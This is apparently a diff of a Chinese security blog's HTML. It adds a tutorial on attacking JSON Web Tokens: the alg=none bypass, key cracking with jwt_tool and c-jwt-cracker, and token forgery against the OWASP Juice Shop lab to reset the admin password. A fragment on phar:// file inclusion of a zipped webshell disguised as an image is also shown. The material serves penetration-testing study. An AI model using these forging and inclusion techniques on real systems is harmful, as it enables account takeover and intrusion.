-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515556491-62148313-87da-49b8-89d0-44c27b79e531.png"></p>
+<p><img src="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515556491-62148313-87da-49b8-89d0-44c27b79e531.png"></p>
 <h1 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h1><blockquote>
 <p><font style="color:rgb(77, 77, 77);">phar:&#x2F;&#x2F;伪协议</font><br><font style="color:rgb(77, 77, 77);">这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a><font style="color:rgb(77, 77, 77);">文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</font></p>
 </blockquote>
@@ -1021,7 +389,735 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/">展开全文 >></a>
+          <a class="article-more-a" href="/2025/03/31/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-JWT攻击" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/03/31/JWT%E6%94%BB%E5%87%BB/">JWT攻击</a>
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/JWT%E6%94%BB%E5%87%BB/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:03:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12906?time__1311=GqGxuD9QiQGQdGN4CxUE=QG8i634Y5r3x&u_atoken=eeda24ac15063dd11615c65e5362ada0&u_asig=1a0c39a017283574289661729e0133#toc-0">JWT渗透姿势一篇通 - 先知社区 (aliyun.com)</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h3><p>JSON Web Token (JWT) 是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。它们理论上可以包含任何类型的数据，但最常用于发送有关用户信息的声明，作为身份验证、会话处理和访问控制机制的一部分。</p>
+<p>与经典会话令牌不同，服务器需要的所有数据都存储在 JWT 本身的客户端中。这使得 JWT 成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。</p>
+<p>它一般会放置在<strong>Authorization</strong>、<strong>Cookie</strong>或者请求体里面。</p>
+<h3 id="JWT有什么用"><a href="#JWT有什么用" class="headerlink" title="JWT有什么用"></a>JWT有什么用</h3><p>JWT 最常见的场景就是授权认证，一旦用户登录，后续每个请求都将包含 JWT，系统在每次处理用户请求的之前，都要先进行 JWT 安全校验，通过之后再进行处理。主要用于验证用户身份信息及跨域的身份验证。</p>
+<h3 id="为什么引入JWT"><a href="#为什么引入JWT" class="headerlink" title="为什么引入JWT"></a>为什么引入JWT</h3><p>弥补session认证。</p>
+<p>在传统的web应用中，我们通常采用session认证：</p>
+<p><strong>session认证流程：</strong></p>
+<p>1.客户端将用户名&#x2F;密码通过某种加密的方式发送给服务器</p>
+<p>2.服务器接收到客户端请求之后进行验证，验证通过后使用Set-Cookie将用户的唯一	session id放入到cookie当中，并将生成的session id和用户的关联信息存入到内存。</p>
+<p>3.客户端第二次访问后服务器从当前cookie中取出session id并从内存中拿到相同的session id，如果不存在，或者没有携带session id则说明该用户登陆过期，或者未登陆。</p>
+<p><strong>session认证的一些缺点：</strong></p>
+<p>1.由于使用session进行认证的方式必须存储sessionid，当用户量过大时对服务器内存消耗影响巨大。如果你没有设置session的过期时间（关闭浏览器并不会导致cookie消失），那么对你的服务器来说消耗是致命的。</p>
+<p>2.如果你没有将session存在一个所有服务器都可以获取得到的地方，如redis。那么意味着在本台服务器上面存储的sessionid其他服务器无法获取。用户进行请求时必须请求到这台服务器上面。可扩展性较差。</p>
+<p>3.跨平台性较差，传统的session认证方式在移动端很难行得通。你必须开发二套不同的逻辑对web和移动端进行认证。</p>
+<p><strong>jwt认证流程：</strong></p>
+<p>1.客户端将用户名&#x2F;密码通过某种加密的方式发送给服务器。</p>
+<p>2.服务器接收到客户端请求后进行验证，验证通过服务器生成token返回给客户端。客户端将token存储在本地。</p>
+<p>3.客户端每次请求将token携带在http header头中， 服务器端将token取出进行解密。</p>
+<hr>
+<p><strong>jwt认证的优点：</strong></p>
+<p>1.服务器端无需保存token，以加解密的方式代替存储，节省了内存空间。</p>
+<p>2.无状态的token不依赖于服务器保存会话信息，更利于水平扩展。</p>
+<p>3.相比于传统的session认证方式，jwt对移动端的支持更友好。</p>
+<h3 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h3><p>JWT由三部分组成，用.拼接。举例如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
+
+<p>使用专业网站：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 或者 <a target="_blank" rel="noopener" href="https://token.dev/">https://token.dev/</a>（不常用）</p>
+<p>JWT由三部分构成：</p>
+<p><strong>第一部分我们称它为头部（header)，是一个 JSON 对象。</strong></p>
+<blockquote>
+<p>头部是用来声明此jwt的类型和加密算法，它们通常由alg和typ这二个字段组成。</p>
+</blockquote>
+<p>alg字段通常用于表示加密采用的算法。如“HS256”、“RS256”等</p>
+<p>typ字段通常用于表示类型</p>
+<p>还有一些其他可选参数，如“kid”、“jku”、“ x5u”等</p>
+<p><strong>第二部分我们称其为载荷（payload)，是一个 JSON 对象。</strong></p>
+<p>主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明。</p>
+<p>iss：该字段表示jwt的签发者。可以用你的应用唯一标识或者高权限的userid填充此字段。</p>
+<p>sub：该jwt面向的用户。</p>
+<p>aud：jwt的接收方。</p>
+<p>exp：jwt的过期时间,通常来说是一个时间戳。</p>
+<p>iat：jwt的签发时间,常来说是一个时间戳。</p>
+<p>jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问</p>
+<p><strong>第三部分是签证（signature)</strong></p>
+<p>Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。</p>
+<p><img src="/2025/03/31/JWT%E6%94%BB%E5%87%BB/1726647379495-4c974c11-713e-483a-8bfb-67a3c726dd3c.png"></p>
+<p>阅读 JWT 的第三部分，可以得知 JWT 是怎么来了：</p>
+<p>第一部分：对 JSON 的头部做 base64 编码处理得到</p>
+<p>第二部分：对 JSON 类型的 payload 做 base64 编码处理得到</p>
+<p>第三部分：</p>
+<p>1.分别对头部和载荷做base64编码，并使用.拼接起来</p>
+<p>2.使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为 JWT 第三部分</p>
+<p><strong>在大多数情况下，任何有权访问令牌的人都可以轻松读取或修改此数据。因此，任何基于 JWT 的机制的安全性都严重依赖于加密签名。</strong></p>
+<h3 id="JWT-特征识别"><a href="#JWT-特征识别" class="headerlink" title="JWT 特征识别"></a>JWT 特征识别</h3><p>一般会放置在Authorization、Cookie或者请求体里面。</p>
+<p>以eyJ开头，.分割成三部分。对应检测的正则如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(eyJ[A-Za-z0-9_-]&#123;<span class="number">10</span>,&#125;\.[A-Za-z0-<span class="number">9.</span>_-]&#123;<span class="number">10</span>,&#125;|eyJ[A-Za-z0-9_\/+-]&#123;<span class="number">10</span>,&#125;\.[A-Za-z0-<span class="number">9.</span>_\/+-]&#123;<span class="number">10</span>,&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以通过HaE插件很方便的识别</p>
+<p><img src="/2025/03/31/JWT%E6%94%BB%E5%87%BB/1726647540729-ad38e2c7-b1a1-4b2d-b1ad-51224b13d04a.png"></p>
+<h3 id="JWT、JWS与JWE"><a href="#JWT、JWS与JWE" class="headerlink" title="JWT、JWS与JWE"></a>JWT、JWS与JWE</h3><p>JWT规范的约束实际上是非常有限的。因为它只定义了将信息（“声明”）表示为可以在双方之间传输的JSON对象的格式。在实际使用中，JWT并没有真正作为一个独立的实体使用。JWT规范由JSON Web签名(JWS)和JSON Web加密(JWE)规范组成，共同定义了实际实现JWT的具体方法。</p>
+<p><img src="/2025/03/31/JWT%E6%94%BB%E5%87%BB/1726647753654-a7df19f8-c559-4a06-9c8a-25848b9a0042.png"></p>
+<p>也就是说，JWT通常是指JWS或JWE令牌，JWE同理，只是令牌的实际内容是经过加密的。</p>
+<p>简单来说就是：jws(JSON Web Signed)并没有对数据进行加密，如果我们想保证数据的安全就需要使用jwe(JSON Web Encryption)对jwt进行加密。</p>
+<p>关于这一点，更进一步的解释参见：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fCyOEJvDqtxObO1GXT_iUA">一文读懂JWT,JWS,JWE</a></p>
+<h3 id="生成JWT"><a href="#生成JWT" class="headerlink" title="生成JWT"></a><font style="color:rgb(79, 79, 79);">生成JWT</font></h3><p><font style="color:rgb(77, 77, 77);">Python生成Jwt Web Token：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;jwt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: time.time(),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#                                秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload, <span class="string">&quot;1121&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=head)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line">运算结果：</span><br><span class="line">eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2Njg2NTI3NjguMzE2MjY5MiwibmFtZSI6ImFkbWluIn0.CfR27zXtS7CUf99AkEG4LroIT19dKdgPmqcrTC7sD3o</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id><a href="#" class="headerlink" title></a></h3><h2 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h2><h3 id="爆破密钥工具："><a href="#爆破密钥工具：" class="headerlink" title="爆破密钥工具："></a>爆破密钥工具：</h3><h4 id="jwtcrack"><a href="#jwtcrack" class="headerlink" title="jwtcrack"></a>jwtcrack</h4><p><font style="color:rgb(77, 77, 77);">使用C语言编写的爆破工具，基于计算机的算力爆破的，并非基于密码本爆破。</font><br><font style="color:rgb(77, 77, 77);">项目地址：</font></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<p><font style="color:rgb(77, 77, 77);">安装：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker.git</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726648058187-f246ed25-93df-4e89-b361-be117a77dc2b.png"></p>
+<h3 id="综合利用工具—jwt-tool"><a href="#综合利用工具—jwt-tool" class="headerlink" title="综合利用工具—jwt_tool"></a>综合利用工具—jwt_tool</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>jwt_tool是一款用于验证、伪造、扫描和篡改 JWT的综合性工具</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
+<p>它的功能包括：</p>
+<ul>
+<li>检查令牌的有效性</li>
+<li>测试已知漏洞：<ul>
+<li>(CVE-2015-2951) _alg&#x3D;none_签名绕过漏洞</li>
+<li>(CVE-2016-10555) _RS&#x2F;HS256_公钥不匹配漏洞</li>
+<li>(CVE-2018-0114)_密钥注入_漏洞</li>
+<li>(CVE-2019-20933&#x2F;CVE-2020-28637)_空白密码_漏洞</li>
+<li>(CVE-2020-28042)_空签名_漏洞</li>
+</ul>
+</li>
+<li>扫描错误配置或已知弱点</li>
+<li>模糊声明值以引发意外行为</li>
+<li>测试秘密&#x2F;密钥文件&#x2F;公钥&#x2F;JWKS 密钥的有效性</li>
+<li>通过字典爆破密钥</li>
+<li>伪造新的令牌标头和有效负载内容并使用密钥或通过其他攻击方法创建新签名</li>
+<li>时间戳篡改</li>
+<li>RSA 和 ECDSA 密钥生成和重建（来自 JWKS 文件）</li>
+<li>…还有更多！</li>
+</ul>
+<p>关于上述功能，以及工具的使用细节，参考这里：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool&#x2F;wiki</a></p>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install termcolor cprint pycryptodomex requests</span><br><span class="line">git clone https://github.com/ticarpi/jwt_tool.git</span><br><span class="line">cd jwt_tool</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726651911901-cc491e80-1b80-4953-8697-e2778380d820.png"></p>
+<h4 id="查看jwt的值"><a href="#查看jwt的值" class="headerlink" title="查看jwt的值"></a>查看jwt的值</h4><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726651958629-20dac402-078e-4947-a31d-8548d54a9f57.png"></p>
+<p><img src="/2025/03/31/JWT%E6%94%BB%E5%87%BB/1726652090301-e7491b40-9eff-4e0f-bf70-8b16727f848f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652124762-1ad8ee68-6e76-4b14-aa95-23ea792d62e3.png"></p>
+<h4 id="X-a-设置签名为空"><a href="#X-a-设置签名为空" class="headerlink" title="-X a 设置签名为空"></a>-X a 设置签名为空</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoidXNlcnMifQ.PcT7hCKp4B275nb8uy3tTNr_lYSws0VZldtIRQy43fcNe3B2F5Fv3pzqHr6vA50eBeMFbUfwJoCUoqPtOHXNp-_uH63ZfHZMZmreNngIHQ8D2Uo6Tg2NMR-YOYOX3Mz9UOeQsbk48X9U0t8L-pi2qDQUTEloaBaWLSCVQIfhyDablIOtzAc45FWwfuR5PgydWmc1COunDSEs9QNl_klbtjK6VSv46VY35P2ljyW2sLPasa1iZG68QVYmzWpq629T8_tbGcGngCDfTMK4jD4hWarhvBeEkpACAGvxlyoFclYlwcDLMSmPt8FwvDy2iQLL6dvN1NuCP629Zt-U7p7hWA -X a</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">查看帮助手册得知：</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;-X a&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的作用是设置</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;alg&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">为</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;none&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">，即：设置签名为空。</font><br><font style="color:rgb(77, 77, 77);">可以看到工具生成了四种不同 none 值对应的 payload ，实际测试中可以逐一替换进行测试，同时也可尝试将“alg”字段直接置空（使用</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;-X n&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">）。</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652201518-30252e3b-43b6-4522-ae2c-6b59a372c7c6.png"></p>
+<p><font style="color:rgb(77, 77, 77);">base64解码得知，用户名没变，所以还需要把拿到的结果，手工修改才行。</font></p>
+<p><img src="/2025/03/31/JWT%E6%94%BB%E5%87%BB/1726652251245-1803ea37-bc5c-4f84-8551-340e6fe2aea5.png"></p>
+<p><font style="color:rgb(77, 77, 77);">经过上面的演示，个人感觉这个功能没啥用。</font></p>
+<p><font style="color:rgb(77, 77, 77);"></font></p>
+<h4 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a><font style="color:rgb(77, 77, 77);">破解密钥</font></h4><p><a target="_blank" rel="noopener" href="https://authlab.digi.ninja/JWT_Cracking">https://authlab.digi.ninja/JWT_Cracking</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用字典破解</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定密码</span></span><br><span class="line">python3 jwt_tool.py JWT_HERE -C -p password_here</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652362766-99ce0db0-6a8a-429f-8652-b0d9b80c95ad.png"></p>
+<p>假如字典没爆破出来，jwt会提示让我们用hashcat工具，并且给出了代码示例。</p>
+<p>我们只要将jwt数据保存到一个文件中，然后看情况执行它给的命令。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769547530-1ebf6411-f2f3-4f91-b111-a4591e2affe5.png"></p>
+<p>演示：</p>
+<p>由于该例中，以及知道jwt由6位数字构成，所以直接掩码爆破</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769691045-fc7be289-e63d-4e58-93c1-d06865599de1.png"></p>
+<p>成功拿到密钥</p>
+<h4 id="生成签名后的JWT"><a href="#生成签名后的JWT" class="headerlink" title="生成签名后的JWT"></a>生成签名后的JWT</h4><p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p><font style="color:rgb(77, 77, 77);">首先是得破解出密钥，然后来到</font><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><font style="color:rgb(77, 77, 77);">篡改payload（但是在这个网站上填写密钥就可以生成签名了，没必要再去工具中让他生成了）</font></p>
+<p><font style="color:rgb(77, 77, 77);"></font></p>
+<p><font style="color:rgb(77, 77, 77);">假如我们知道对方是怎么加密的，我们可用照着它加密的方法再加密：</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769774631-712b05d8-8d11-4519-83fd-bfeabefe982e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769867033-e4b39f71-2217-49ba-91dd-54ae245c667d.png"></p>
+<p>这题是由于源码泄露，我们知道了对方是如何加密解密的。我们伪造token的时候用同样的方法即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1730769803465-68eef619-0516-4cda-802e-0003096cd07e.png"></p>
+<p>如果这里直接用jwt.io改的话，会失败，对方还设置了time。只好用python了。</p>
+<h2 id="案例1：Owasp-Juice-Shop"><a href="#案例1：Owasp-Juice-Shop" class="headerlink" title="案例1：Owasp Juice Shop"></a>案例1：Owasp Juice Shop</h2><p>通过此案例，了解最基本的利用方式，以及一些注意事项！</p>
+<p>你可以使用在线靶场：<a target="_blank" rel="noopener" href="https://juice-shop.herokuapp.com/">https://juice-shop.herokuapp.com/</a></p>
+<p>或者本地docker搭建：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull bkimminich/juice-shop</span><br><span class="line">docker run -d -p <span class="number">80</span>:<span class="number">3000</span> bkimminich/juice-shop</span><br></pre></td></tr></table></figure>
+
+<p>如何攻击？思路是，尝试设置 JWT 的加密方式为空，这样我可以自行设计出 JWT 的前两部分，第三部分置为空。然后通过修改账号密码的方式来重置管理员的密码。开始演示。</p>
+<h3 id="1-发现JWT登录"><a href="#1-发现JWT登录" class="headerlink" title="1. 发现JWT登录"></a><font style="color:rgb(79, 79, 79);">1. 发现JWT登录</font></h3><p><font style="color:rgb(77, 77, 77);">注册账户：<a href="mailto:&#49;&#x32;&#51;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">123@qq.com</a>，123456登录系统，发现存在 JWT。并且注意到</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Authorization&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">与</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;Cookie&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">中</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;token&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);">的值是一致的。</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652702210-b872e40b-fd45-4d0b-9e93-092cbd05c9f7.png"></p>
+<h3 id="2-发现网站邮箱格式"><a href="#2-发现网站邮箱格式" class="headerlink" title="2. 发现网站邮箱格式"></a><font style="color:rgb(79, 79, 79);">2. 发现网站邮箱格式</font></h3><p><font style="color:rgb(77, 77, 77);">浏览网页，发现网站使用的邮箱格式：</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;@juice-sh.op&lt;/font&gt;</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652746782-3dc2f5aa-3d56-4075-97d1-7b16af8a433d.png"></p>
+<h3 id="3-修改-JWT"><a href="#3-修改-JWT" class="headerlink" title="3. 修改 JWT"></a><font style="color:rgb(79, 79, 79);">3. 修改 JWT</font></h3><p><font style="color:rgb(77, 77, 77);">请求头Authorization的值为：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiIxMjNAcXEuY29tIiwicGFzc3dvcmQiOiJlMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZSIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMS0xNiAwNTozOTo0NS43MDcgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMi0xMS0xNiAwNTo0NDowNC41MjMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjY4NTc3NDU3LCJleHAiOjE2Njg1OTU0NTd9.DXYw24kJYuBcHxuWHEocNupJzjocpCWAoZPByvaJgcZ5K2CXUXYpBYdHCy7L6DZD_Od9Xh7DNJUdfP__6gwLVQ9LJ7k98af3cLBhQ_M7TW2TtoXOOcZzkVnVuN0QW1w7bTK4venFwSeWDuOshpF_fFWGlxd42y4kOS2as2cb5xo</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">来到专业网站分析如下：</font><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br><font style="color:rgb(77, 77, 77);">根据多年口算MD5的经验得知，密码的加密方式是MD5</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652790038-bb15a3b8-9957-410a-97e9-b88e39d751fa.png"></p>
+<p><font style="color:rgb(77, 77, 77);">接下来篡改 JWT 的内容（不要base64编码结果最后面的等号！）</font><br><strong><font style="color:rgb(77, 77, 77);">修改得到JWT第一部分：</font></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652816500-6e1c4125-8e0e-4818-8789-0c0fbb07e31a.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">修改得到JWT第二部分：</font></strong><font style="color:rgb(77, 77, 77);"></font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogIiIsCiAgICAiZW1haWwiOiAiYWRtaW5AanVpY2Utc2gub3AiLAogICAgInBhc3N3b3JkIjogImUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNlIiwKICAgICJyb2xlIjogImN1c3RvbWVyIiwKICAgICJkZWx1eGVUb2tlbiI6ICIiLAogICAgImxhc3RMb2dpbklwIjogInVuZGVmaW5lZCIsCiAgICAicHJvZmlsZUltYWdlIjogIi9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjM5OjQ1LjcwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDIyLTExLTE2IDA1OjQ0OjA0LjUyMyArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNjY4NTc3NDU3LAogICJleHAiOiAxNjY4NTk1NDU3Cn0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726652931402-358a0dc4-7bfd-4412-8f0a-7b3a6e5ebeb7.png"></p>
